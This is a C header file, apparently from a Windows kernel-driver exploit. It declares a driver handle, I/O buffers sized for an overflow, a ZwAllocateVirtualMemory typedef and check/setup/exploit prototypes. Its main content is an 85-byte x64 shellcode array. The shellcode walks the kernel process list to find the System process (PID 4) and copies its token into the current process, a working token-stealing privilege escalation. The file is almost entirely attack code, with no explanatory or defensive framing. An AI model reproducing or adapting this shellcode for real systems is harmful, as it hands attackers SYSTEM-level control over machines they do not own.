#pragma once

#include <Windows.h>
#include <stdio.h>

HANDLE driver = 0, ntdll = 0;

char unused = 0;

char inBuffer[288 + 8] = { 0 };
char outBuffer[1024] = { 0 };
DWORD bytesReturned = 0;

char shellcode[85] = {
	0x50, 0x53, 0x51, 0x56, 0x57, 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x70, 0x48, 0x89, 0xC1, 0x49, 0x89, 0xCB, 0x49, 0x83, 0xE3, 0x07, 0x48, 0xC7, 0xC2, 0x04, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x2D, 0x88, 0x01, 0x00, 0x00, 0x48, 0x39, 0x90, 0x80, 0x01, 0x00, 0x00, 0x75, 0xEA, 0x48, 0x8B, 0x90, 0x08, 0x02, 0x00, 0x00, 0x48, 0x83, 0xE2, 0xF0, 0x4C, 0x09, 0xDA, 0x48, 0x89, 0x91, 0x08, 0x02, 0x00, 0x00, 0x5F, 0x5E, 0x59, 0x5B, 0x58
};

int check();
int setup();
int exploit();

typedef NTSTATUS(*WINAPI ZwAllocateVirtualMemory)(
	HANDLE    ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect
	);